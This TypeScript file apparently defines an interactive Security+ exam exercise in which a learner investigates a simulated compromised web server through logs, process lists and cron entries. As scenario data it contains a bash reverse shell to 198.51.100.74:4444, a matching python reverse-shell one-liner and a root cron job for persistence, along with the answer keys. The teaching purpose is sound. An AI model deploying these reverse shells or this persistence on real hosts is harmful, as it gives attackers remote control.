import type { TerminalScenario } from "../types";

/**
 * Terminal (interactive shell) PBQs for Security+ (SY0-701). Domain 4.0
 * Security Operations — incident investigation at the command line is core to
 * the exam and to real SOC work. The host is synthetic; IPs are in the
 * documentation ranges (RFC 5737) and times are illustrative.
 */
export const securityPlusTerminals: TerminalScenario[] = [
  {
    type: "terminal",
    id: "sec-term-breach-web01",
    title: "Compromised web server",
    briefing:
      "web-01 keeps beaconing to an unknown host and the SOC paged you. You have a read-only analyst shell. Work the command line to reconstruct the intrusion, then report your three findings. Start with cat readme.txt, or type help.",
    domain_number: "4.0",
    domain_title: "Security Operations",
    user: "analyst",
    host: "web-01",
    cwd: "/home/analyst",
    dirs: {
      "/home/analyst": { "readme.txt": "file", "notes/": "dir" },
      "/home/analyst/notes": { "handover.txt": "file" },
      "/var/log": { "auth.log": "file", "syslog": "file", "nginx/": "dir" },
      "/var/log/nginx": { "access.log": "file" },
      "/tmp": { ".sysupdate": "file", "sess_write.lock": "file" },
      "/etc": { passwd: "file", crontab: "file", hostname: "file" },
    },
    files: {
      "/home/analyst/readme.txt": [
        { text: "SOC-4471  web-01 flagged: repeated outbound connections to an unknown host.", tone: "muted" },
        { text: "You have a read-only analyst shell. Find and report:", tone: "muted" },
        { text: "  1. the external IP the attacker connected from" },
        { text: "  2. the account they compromised" },
        { text: "  3. the file their persistence re-runs to keep access" },
        { text: "Good first looks: cat /var/log/auth.log, ps aux, ss -tulpn, crontab -l.", tone: "muted" },
      ],
      "/home/analyst/notes/handover.txt": [
        { text: "web-01: nginx + mysql. 'admin' owns the site deploy; 'analyst' is read-only SOC.", tone: "muted" },
        { text: "Ping me if SSH acts up. — J", tone: "muted" },
      ],
      "/var/log/auth.log": [
        { prefix: "Oct 11 02:13:55 web-01 sshd[2199]: ", text: "Accepted publickey for deploy from 10.0.4.12 port 50880 ssh2", tone: "muted" },
        { prefix: "Oct 11 02:14:03 web-01 sshd[2211]: ", text: "Failed password for admin from 198.51.100.74 port 50912 ssh2", tone: "amber" },
        { prefix: "Oct 11 02:14:05 web-01 sshd[2213]: ", text: "Failed password for admin from 198.51.100.74 port 50920 ssh2", tone: "amber" },
        { prefix: "Oct 11 02:14:08 web-01 sshd[2215]: ", text: "Failed password for root from 198.51.100.74 port 50934 ssh2", tone: "amber" },
        { prefix: "Oct 11 02:14:11 web-01 CRON[2220]: ", text: "pam_unix(cron:session): session opened for user www-data", tone: "muted" },
        { prefix: "Oct 11 02:14:12 web-01 sshd[2219]: ", text: "Failed password for admin from 198.51.100.74 port 50948 ssh2", tone: "amber" },
        { prefix: "Oct 11 02:16:40 web-01 sshd[2263]: ", text: "Failed password for admin from 198.51.100.74 port 51144 ssh2", tone: "amber" },
        { prefix: "Oct 11 02:17:41 web-01 sshd[2290]: ", text: "Accepted password for admin from 198.51.100.74 port 51202 ssh2", tone: "red" },
        { prefix: "Oct 11 02:17:41 web-01 sshd[2290]: ", text: "pam_unix(sshd:session): session opened for user admin", tone: "muted" },
        { prefix: "Oct 11 02:18:10 web-01 sudo: ", text: "   admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash", tone: "red" },
        { prefix: "Oct 11 09:02:14 web-01 sshd[4099]: ", text: "Accepted password for analyst from 10.0.2.2 port 55010 ssh2", tone: "muted" },
      ],
      "/var/log/syslog": [
        { prefix: "Oct 11 02:19:01 web-01 ", text: "CRON[3401]: (root) CMD (/tmp/.sysupdate)", tone: "dim" },
        { prefix: "Oct 11 02:24:01 web-01 ", text: "CRON[3455]: (root) CMD (/tmp/.sysupdate)", tone: "dim" },
        { prefix: "Oct 11 02:29:01 web-01 ", text: "CRON[3509]: (root) CMD (/tmp/.sysupdate)", tone: "dim" },
      ],
      "/var/log/nginx/access.log": [
        { text: '10.0.2.2 - - [11/Oct/2026:08:59:10] "GET /health HTTP/1.1" 200 2', tone: "dim" },
        { text: '198.51.100.74 - - [11/Oct/2026:02:13:40] "GET /server-status HTTP/1.1" 403 199', tone: "dim" },
        { text: '66.249.66.1 - - [11/Oct/2026:07:21:03] "GET /robots.txt HTTP/1.1" 200 24', tone: "dim" },
      ],
      "/tmp/.sysupdate": [
        { text: "#!/bin/bash", tone: "muted" },
        { text: "# system keepalive", tone: "muted" },
        { text: "bash -i >& /dev/tcp/198.51.100.74/4444 0>&1", tone: "red" },
      ],
      "/tmp/sess_write.lock": [{ text: "(binary data)", tone: "dim" }],
      "/etc/passwd": [
        { text: "root:x:0:0:root:/root:/bin/bash", tone: "muted" },
        { text: "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin", tone: "muted" },
        { text: "mysql:x:106:110:MySQL Server:/nonexistent:/bin/false", tone: "muted" },
        { text: "admin:x:1000:1000:Site Admin:/home/admin:/bin/bash", tone: "muted" },
        { text: "analyst:x:1001:1001:SOC Analyst:/home/analyst:/bin/bash", tone: "muted" },
      ],
      "/etc/crontab": [
        { text: "# m h dom mon dow user  command", tone: "muted" },
        { text: "17 *  * * *   root    cd / && run-parts --report /etc/cron.hourly", tone: "muted" },
        { text: "*/5 * * * *   root    /tmp/.sysupdate", tone: "red" },
      ],
      "/etc/hostname": [{ text: "web-01" }],
    },
    commands: [
      {
        match: ["ps aux", "ps", "ps -ef", "top"],
        output: [
          { text: "USER       PID  %CPU %MEM  COMMAND", tone: "muted" },
          { text: "root         1   0.0  0.3  /sbin/init" },
          { text: "root       640   0.0  0.5  /usr/sbin/sshd -D" },
          { text: "www-data   902   0.3  2.1  nginx: worker process" },
          { text: "mysql      955   0.2  6.8  /usr/sbin/mysqld" },
          { text: "admin     3310   0.0  0.1  -bash" },
          { text: 'admin     3344   0.7  0.4  python3 -c import socket,subprocess,os;s=socket.socket();s.connect(("198.51.100.74",4444));os.dup2(s.fileno(),0)', tone: "red" },
          { text: "analyst   4102   0.0  0.1  -bash" },
          { text: "analyst   4190   0.0  0.1  ps aux" },
        ],
      },
      {
        match: ["ss -tulpn", "ss -tulnp", "ss -tlpn", "netstat -tulpn", "netstat -tulnp", "ss", "netstat"],
        output: [
          { text: "Netid State   Local Address:Port      Peer Address:Port       Process", tone: "muted" },
          { text: 'tcp   LISTEN  0.0.0.0:22              0.0.0.0:*               users:(("sshd",pid=640))' },
          { text: 'tcp   LISTEN  0.0.0.0:80              0.0.0.0:*               users:(("nginx",pid=902))' },
          { text: 'tcp   LISTEN  127.0.0.1:3306          0.0.0.0:*               users:(("mysqld",pid=955))' },
          { text: 'tcp   ESTAB   10.0.2.15:49210         198.51.100.74:4444      users:(("python3",pid=3344))', tone: "red" },
        ],
      },
      {
        match: ["last", "last -a"],
        output: [
          { text: "admin    pts/1    198.51.100.74    Sat Oct 11 02:17   still logged in", tone: "red" },
          { text: "analyst  pts/0    10.0.2.2         Sat Oct 11 09:02   still logged in" },
          { text: "admin    pts/0    10.0.2.2         Fri Oct 10 17:30 - 18:10  (00:40)" },
          { text: "reboot   system boot  6.1.0-18      Fri Oct 10 08:00   still running", tone: "muted" },
        ],
      },
      {
        match: ["crontab -l", "crontab -l -u root", "sudo crontab -l"],
        output: [
          { text: "# m h  dom mon dow   command", tone: "muted" },
          { text: "*/5 * * * * /tmp/.sysupdate", tone: "red" },
        ],
      },
    ],
    findings: [
      {
        id: "ip",
        label: "Attacker's external IP",
        placeholder: "e.g. 203.0.113.5",
        accept: ["198.51.100.74"],
        explanation:
          "198.51.100.74 runs the SSH brute force in auth.log, is the source of the successful admin login, and is the peer of the ESTABLISHED connection on port 4444 in ss. Three independent sources, one IP.",
      },
      {
        id: "account",
        label: "Compromised account",
        placeholder: "username",
        accept: ["admin"],
        explanation:
          "The attacker guessed passwords for several users but the 'Accepted password' line — and the follow-on sudo to root — is for admin. root and analyst logins came from internal 10.x hosts, so they're not the breach.",
      },
      {
        id: "persistence",
        label: "Persistence file",
        placeholder: "full path",
        accept: ["/tmp/.sysupdate", "tmp/.sysupdate", ".sysupdate", "sysupdate"],
        acceptBasename: true,
        explanation:
          "crontab -l shows a root cron job running /tmp/.sysupdate every 5 minutes; syslog confirms it firing. cat /tmp/.sysupdate is the reverse shell back to the attacker on 4444 — that's the beacon the SOC saw.",
      },
    ],
    explanation:
      "Kill chain: an SSH brute force from 198.51.100.74 cracked the admin password, the attacker escalated to root, dropped a reverse-shell script at /tmp/.sysupdate, and scheduled it in root's crontab to run every 5 minutes — the repeated outbound connections to 198.51.100.74:4444 that triggered the alert. Containment: kill PID 3344, remove the cron entry and /tmp/.sysupdate, block the IP, and reset admin's credentials.",
    estimatedMinutes: 6,
  },
];
